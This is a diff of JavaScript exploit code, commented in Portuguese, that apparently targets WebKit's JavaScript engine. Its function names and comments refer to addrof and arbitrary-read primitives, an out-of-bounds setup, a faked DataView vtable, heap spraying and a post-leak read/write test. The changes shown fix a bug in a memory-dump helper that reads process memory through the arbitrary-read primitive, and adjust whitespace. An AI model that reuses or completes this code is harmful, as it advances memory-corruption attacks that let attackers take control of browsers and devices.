@@ -50,7 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        let hexLine = address.add(i + j).toString(16).padStart(2, '0') + " "; // Corrigido aqui
+        let hexLine = address.add(i).toString(16).padStart(2, '0') + " "; // Corrigido aqui
         let asciiLine = "  ";
         let rowBytes = [];
 
@@ -328,7 +328,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let found_m_mode = null;
 
     // Declaração da variável fora do try/catch para evitar redeclaração
-    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null;    
 
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -529,8 +529,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             const rwTestPostLeakStartTime = performance.now();
 
             const test_obj_post_leak = global_spray_objects.length > 0 ?
-                                       global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
-                                       { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
+                                        global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
+                                        { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
             hold_objects.push(test_obj_post_leak);
             logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
 
